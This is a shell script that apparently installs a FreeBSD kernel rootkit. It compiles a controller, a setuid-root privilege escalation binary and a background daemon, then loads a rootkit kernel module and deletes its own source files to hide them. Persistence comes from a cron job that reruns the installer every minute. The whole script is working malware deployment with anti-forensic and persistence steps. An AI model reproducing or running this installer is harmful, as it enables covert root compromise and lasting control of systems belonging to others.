#!/bin/sh

if [ ! -e /lib/daemon ]; then
	cc controller.c -o /sbin/controller
	chmod 755 /sbin/controller
	cc priv_esc.c -o /bin/priv_esc
	chmod 755 /bin/priv_esc
	chmod +s /bin/priv_esc
	cc daemon.c -o /lib/daemon
fi

if [ ! -e /dev/cd ]; then
	make clean
	make
	mv rootkit.ko /boot/kernel
	/sbin/kldload /boot/kernel/rootkit.ko
	echo "" > /log.txt
	chmod 666 /log.txt
	/lib/daemon $1 &
	make clean
	rm .depend.rootkit.o
fi

if [ -e daemon.c ]; then
	rm -f controller.c priv_esc.c daemon.c rootkit.c
fi

if [ ! -e /var/cron/tabs/persistance ]; then
	echo "SHELL = /bin/sh" > persistance
	echo "* * * * * /etc/install $1" >> persistance
	crontab persistance
	rm persistance
fi

if [ ! -e /etc/install ]; then
	mv install /etc/install
fi
